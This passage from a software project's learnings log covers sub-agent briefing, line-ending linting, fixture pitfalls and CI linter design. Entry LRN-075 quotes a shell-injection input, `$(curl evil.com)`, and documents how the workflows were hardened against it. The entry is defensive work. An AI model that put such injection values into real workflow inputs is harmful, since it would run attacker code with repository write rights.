**Finding:** Multi-stage CSs that introduce a known enforcement window need an EXPLICIT B.4-equivalent cleanup checklist that enumerates every workaround marker (in CI workflows, test files, scripts, AND active CS Tasks ledger). Relying on memory or "obvious removal" is fragile. Mitigation: when adding a TODO marker tied to a future CS stage, also add the marker file path to a dedicated "Stage-window markers to remove" section of the active CS file. The plan-vs-impl review gate's "no `TODO(CSnn)` markers remain" exit criterion is a backstop, not a substitute for explicit tracking.

**Evidence:** CS11 PR #37 R1 plan-vs-impl gate found `--skip composed-blocks` + `TODO(CS11 B.4)` markers still in `tests/cli.test.mjs` after B.4 had supposedly cleaned up. The fix was a one-line removal per affected test, but the gate caught what would otherwise have shipped as a quiet correctness regression (tests would have continued reporting "pass" while skipping the very check they should have been validating).

**Disposition:** When authoring a multi-stage CS spec that introduces enforcement-window workarounds, add an explicit "Stage-window markers" section to the active CS file listing every workaround marker file path. The B.4-equivalent stage's exit criteria reference this list explicitly. The plan-vs-impl gate continues to backstop, but explicit tracking is cheaper than gate-iteration cost.

### LRN-073

```yaml
id: LRN-073
date: 2026-05-04
category: process
source_cs: CS11
status: applied
tags: [canonical-preamble, sub-agent-briefing, verbatim-paste, large-prompts, cumulative-validation, lrn-068-followup]
claim_area: sub-agent-coordination
```

**Problem:** LRN-068 mandated that every sub-agent dispatch paste the canonical briefing preamble verbatim into the prompt. CS11 was the first CS to operationalize this: the cs11-preamble sub-agent (Stage 0) authored the canonical block in `template/composed/OPERATIONS.md` § Sub-agent dispatch, and the orchestrator pasted the block verbatim into the cs11-config and cs11-ci sub-agent dispatches. Open question: does the verbatim paste actually improve sub-agent compliance vs. a hyperlinked reference?

**Finding:** Yes, materially. Both cs11-config and cs11-ci sub-agent reports cleanly addressed every section of the canonical preamble: PREFLIGHT SHA recording (matches), file-ownership scope (only owned files modified), conventions (BOM check pass, LF/no-BOM, `requireValue` guard noted, schema-source-of-truth), self-checks (`git status`, `git log`, BOM check, syntax checks), and the mandatory report shape (all required fields populated). The cs11-preamble sub-agent's own dispatch (the bootstrap moment) also cleanly addressed all sections even though the canonical block was authored DURING that dispatch (the orchestrator pasted the de-facto pre-existing requirements). Zero rogue commits across 3 CS11 dispatches; cumulative count ~46 across CS01–CS11 with zero violations after LRN-021 standardization.

**Evidence:** CS11 PR #37: 3 sub-agent reports in cs11/content commit history all match the canonical preamble structure exactly. Stage 0's cs11-preamble report explicitly noted that the BOM check returned `False` for all 5 owned files — a section that previously had been intermittently reported across CSs. The verbatim paste produced consistent, complete self-checks where reference-only briefings had produced sporadic ones.

**Disposition:** Permanent. The verbatim-paste discipline is the new normal for every sub-agent dispatch. Cost (large prompts) is real but worth it. Future improvement: tooling (e.g. `harness brief --preamble`) could automate the paste, but the discipline is mechanical enough that orchestrator-side paste is sustainable in the meantime. The cumulative dispatch count (~46) with zero violations is the strongest empirical evidence that the LRN-016 + LRN-021 + LRN-068 + LRN-073 pattern stack is durable at scale.

### LRN-074

```yaml
id: LRN-074
date: 2026-05-04
category: tooling
source_cs: CS03c
status: applied
tags: [line-endings, crlf, autocrlf, sync-drift, harness-self-check, windows, mechanical-enforcement]
claim_area: linter-design
```

**Problem:** CS11's self-host swap (PR #37) landed all 10 root files as LF in the git index, but on Windows the working tree carried CRLF (git's `core.autocrlf=true` converted on checkout). `harness sync --mode=check` reads working-tree bytes and compares against the rendered template (LF). Result: false-drift detected on Windows even though the git history was LF-canonical and Linux CI would see no drift. CS11 R1 review caught this with a 3-step fix (`.gitattributes` + `core.autocrlf=false` + lock refresh). The deeper failure: there was no linter that would have caught CRLF in the working tree before sync surfaced it as drift.

**Finding:** Windows-Linux line-ending mismatches are a recurring, mechanical problem that affects any tool comparing file bytes (sync drift detection, hash-based caches, content-address validators). The defensive layer is a linter that runs in `harness lint` on every PR (and as part of sub-agent self-checks) and rejects any text-file with CRLF or bare `\r`. Combined with `.gitattributes eol=lf`, this prevents the class of bugs entirely. CS03c added this as `scripts/check-text-encoding.mjs` (also covers LRN-006/018/065 BOM detection in the same scan — single linter, two checks for efficiency).

**Evidence:** CS11 PR #37 R1 found `harness sync --mode=check` failing on Windows due to CRLF drift; R2 found `.harness-lock.json` rendered_hash entries had been computed from CRLF content. Two iterations of fix; root cause was Windows autocrlf interaction. CS03c PR #40 added `check-text-encoding.mjs` (BOM + CRLF detection); wired into `harness lint`; ran clean against the harness repo (338 files checked, 0 violations). The plan-vs-impl gate caught a `.git`-substring-matches-`.github` exclude bug in the linter itself (R1 NEEDS-FIX → R2 GO with segment-prefix matching) — meta-validation that the gate works.

**Disposition:** `check-text-encoding` is now part of the standard 13-linter aggregator and runs by default. Future projects bootstrapped via `harness init` will inherit the same enforcement. The linter is also referenced in the canonical sub-agent briefing preamble (CS11 LRN-068 follow-up) as the standard self-check command — replaces the previous PowerShell BOM-check snippet.

### LRN-075

```yaml
id: LRN-075
date: 2026-05-04
category: tooling
source_cs: CS12
status: applied
tags: [github-actions, shell-injection, workflow-security, env-vars, allowlist-validation, ci-supply-chain]
claim_area: workflow-design
```

**Problem:** CS12 added two GitHub Actions workflow files (`harness-checks.yml` reusable + `harness-drift.yml` template). Initial implementation interpolated GitHub expressions (workflow input `cli-ref`, derived ref from `harness.config.json`, `${{ github.repository }}`, `${{ github.sha }}`) directly into `run:` shell scripts. PR #48 R1 review flagged this as a shell-injection vulnerability: a malicious or malformed ref like `$(curl evil.com)` would be expanded by bash even inside double quotes. The drift workflow has `contents: write` + `pull-requests: write` permissions, so blast radius was substantial — a malicious config could trigger arbitrary code execution with PR-creation rights.

**Finding:** GitHub Actions workflows that consume any externally-influenced data (workflow inputs, file contents, expression outputs) into `run:` shell bodies must (a) **never interpolate GitHub expressions directly** into the script body — pass them through `env:` instead so bash only sees the value as an environment variable; AND (b) **validate the value against an allowlist regex** before any shell consumption. The allowlist for "git refs" is conservative: `^[a-zA-Z0-9._/-]+$` covers semver tags, branch names, and 40-char SHAs while rejecting all shell metacharacters. Combination of env-passing + allowlist-validation is the defence-in-depth pattern.

**Evidence:** CS12 PR #48 R1 review reproduced the threat: any caller could pass `cli-ref: $(curl evil.com)` to the reusable workflow; with the original implementation, that would execute as shell on the runner. R1 fix in commit `9dcb258`: passes `inputs.cli-ref` and `steps.derive-ref.outputs.ref` through `env:` (CLI_REF, GH_REPO, GH_SHA), validates the derived ref via `printf '%s' "$ref" | grep -Eq '^[a-zA-Z0-9._/-]+$'`, exits with a clear error pointing to the CS12 R1 PR review on rejection. Reusable workflow also gained explicit `permissions: contents: read` (least privilege). 3 new regression tests in `tests/cs12-workflows.test.mjs` (17 total) assert the env-pass + allowlist pattern is present in both workflows; a future bypass attempt at code-review time would fail tests.

**Disposition:** Convention to apply to every future GitHub Actions workflow in this repo and in template/managed/.github/workflows/: any GitHub expression consumed by `run:` MUST go through `env:`, NEVER directly interpolated; any externally-influenced value going to shell MUST be validated against an allowlist regex. Document as a CONVENTIONS.md entry (or extend `check-workflow-pins.mjs` to mechanically detect direct-expression-in-run patterns at lint time — file as a follow-up CS if/when needed).

### LRN-076

```yaml
id: LRN-076
date: 2026-05-04
category: tooling
source_cs: CS13
status: applied
tags: [test-fixtures, gitignore, ci-windows-linux-divergence, mechanical-enforcement, false-green]
claim_area: linter-design
```

**Problem:** Two `tests/check-public-artifact.test.mjs` subtests (CS06) silently behaved differently on Windows vs Linux CI for many CSes:
- Test 3 used fixture file `tests/fixtures/cs06/public-artifact/aws-key/credentials.log`. The repo `.gitignore` includes `*.log` (line 2), so the fixture was never committed. Locally on Windows the file existed in the working tree (the original author created it) and the test passed; on CI the file did not exist, the linter scanned an empty dir, no AWS pattern was found, exit 0, and the test asserted exit 1 → fail.
- Test 7 referenced `tests/fixtures/cs06/public-artifact/empty-dir/` which never gets committed by git (git cannot track empty directories). On Linux CI the dir didn't exist → linter exited with "directory not found" → test fail.

These two failures had been red on `harness-self-check` since CS06 land but the orchestrator workflow (Windows) never noticed them because `node --test` was green locally. CS13 PR #51 made them visible because the new green-CI gate revealed the historical false-green.

**Finding:** Test-fixture trees are particularly susceptible to invisible drift between local dev and CI: the CI environment is the only one with the authoritative view of "what's actually committed". Two cheap mechanical defenses prevent the class:
1. **No gitignored files under `tests/fixtures/`.** A linter that runs `git check-ignore` over every path under `tests/fixtures/` and fails on any match catches the credentials.log case.
2. **Empty dirs need a `.gitkeep` OR the test must mkdtemp at runtime.** Pattern: `mkdtempSync(path.join(tmpdir(), 'prefix-'))` for tests that need a guaranteed-empty directory. Avoids tracking empty dirs and guarantees clean state per test run.

**Evidence:** CS13 PR #51 R1 saw both tests failing on Linux CI with the exact symptoms above (`Expected exit 1; got 0; got: ''` and `Expected exit 0 for empty dir; got 1; stderr: directory not found`). Fixed by (a) renaming `credentials.log` → `credentials.txt` (also stripped CRLF per LRN-074), and (b) switching the empty-dir test to `mkdtempSync(path.join(tmpdir(), 'check-pub-empty-'))`. After fix: 486/486 local + green CI on the merged commit. Mechanical enforcement added in CS13: `scripts/check-fixtures.mjs` runs `git check-ignore` over `tests/fixtures/**` and fails on any match; wired into `harness lint` aggregator (15 linters now).

**Disposition:** Convention: never use file extensions that overlap `.gitignore` (`*.log`, `*.tmp`, build outputs) inside `tests/fixtures/`. For tests requiring an empty dir, always `mkdtempSync` at runtime. The `check-fixtures` linter mechanically enforces (a). Future scaffold/template fixture authoring follows the same rule.

### LRN-077

```yaml
id: LRN-077
date: 2026-05-04
category: tooling
source_cs: CS13
status: applied
tags: [linter-design, self-host, consumer-vs-harness, opt-in, default-skip]
claim_area: linter-design
```

**Problem:** CS13 added `check-pack` which validates the harness's own npm tarball shape (forbidden patterns, required entries, size budget). This linter only makes sense when the cwd IS the agent-harness repo — running it against a consumer repo would produce false failures (different `package.json`, different required entries, different size budget). But `harness lint` runs all registered linters by default. How to register a harness-only linter that doesn't break consumers?

**Finding:** Self-host-only linters should be registered in the aggregator with a `target: null` skip pattern guarded by a runtime check that inspects the cwd's `package.json.name`. Example:

```js
const pkgJsonPath = path.join(consumerRoot, 'package.json');
const isHarnessSelfHost = (() => {
  try {
    const pkg = JSON.parse(fs.readFileSync(pkgJsonPath, 'utf8'));
    return pkg.name === '@henrik-me/agent-harness';
  } catch { return false; }
})();
const target = isHarnessSelfHost ? consumerRoot : null;
```

Setting `target: null` makes the aggregator skip the linter cleanly (counted in the "skipped" tally, not "failed"). The linter still works when invoked directly via `node scripts/check-pack.mjs --cwd .` for ad-hoc consumer use. This pattern preserves the principle that `harness lint` against a consumer repo never produces false failures from harness-internal-only checks.

**Evidence:** CS13 PR #51 implementation: `bin/harness.mjs` `cmdLint` aggregator's `check-pack` entry uses the guard above. Local verification: `node bin/harness.mjs lint --quiet` against the harness repo shows `pack: pass`; against a non-harness consumer repo (tested with a scratch `package.json`) shows `pack: skipped (target not found)`. Aggregator total: 14 pass / 0 fail / 3 skipped on harness; 13 pass / 0 fail / 4 skipped on consumer.

**Disposition:** Pattern documented in CONVENTIONS.md (or future `LINTER-AUTHORING.md`): linters that validate the harness package, the harness templates, the harness CI workflows, or any other harness-internal artifact MUST use the self-host guard. Consumer-side linters (the default) MUST NOT need any guard. A small naming convention helps: harness-only linter scripts can be prefixed `check-self-` (e.g. `check-self-pack`) to make their intent obvious — defer until we have a second example to justify the rename.

### LRN-078

```yaml
id: LRN-078
date: 2026-05-04
category: tooling
source_cs: CS14
status: applied
tags: [github-actions, yaml-parse, fail-loud, mechanical-enforcement, ci-silent-failure, workflow-design]
claim_area: linter-design
```

**Problem:** CS14's `private-smoke.yml` had an unquoted `:` in a step name (`- name: Configure git url-rewrite (use GITHUB_TOKEN for github: protocol)`). YAML's parser reads this as `name: Configure git url-rewrite (use GITHUB_TOKEN for github` followed by an invalid mapping `: protocol)`, and rejects the file. GitHub Actions silently failed the workflow run with the unhelpful message "This run likely failed because of a workflow file issue" — no syntax-error pointer, no log content. The local linter `check-workflow-pins.mjs` (CS06) detected the parse failure but only emitted a WARNING and fell back to regex extraction for its specific job (extracting action refs); the warning was acceptable because js-yaml might be unavailable on consumer machines.

**Finding:** The fail-soft fallback in `check-workflow-pins.mjs` was correct for the "js-yaml not installed" case (regex fallback works for the pin-extraction job) but masked the more important "js-yaml IS installed AND the file is genuinely broken YAML" case. Mechanical enforcement: when js-yaml IS available and parsing fails, that ALWAYS means the workflow file is broken (because if a real GitHub runner can't parse it, the workflow will silently fail). Promote the warning to an ERROR in that specific case; keep the regex fallback as a last-resort path only for the js-yaml-unavailable case (with a friendly WARNING).

**Evidence:** CS14 PR #53 close-out: extended `scripts/check-workflow-pins.mjs` to track `yamlParseError` separately from `usedFallback`. When `yamlParseError` is non-null AND js-yaml is available, emit `ERROR: <path>: YAML parse failed (<message>). The workflow file is invalid and would be rejected by GitHub Actions. See LRN-078.` and increment `totalErrors` (causes non-zero exit). Tested against the broken `private-smoke.yml` from the failed CI run — the linter now exits 1 with the parse error pointed at the exact line. After fixing the YAML (quoted the step name), linter passes again.

**Disposition:** Now mechanically enforced. Future YAML errors in `.github/workflows/` will fail at lint time before the workflow ever reaches GitHub Actions, eliminating the "silent run failure" class. The pattern generalizes: any tool that has both a "best-effort fallback" path and a "strict-mode" path should prefer strict-mode-by-default when the strict-path is reliably available. The fallback is for environment-degraded scenarios, not for accommodating broken inputs.

## Obsolete

(none yet)

## Deferred

> **Note:** Section headers (Open / Applied / Obsolete / Deferred) are organizational hints. The authoritative status for each entry is its YAML frontmatter status field. Entries with status: deferred (LRN-009, LRN-011, LRN-014, LRN-019, LRN-020 in this file) appear under § Applied above for chronological readability — check-learnings.mjs (CS06) validates the status field, not the section placement.
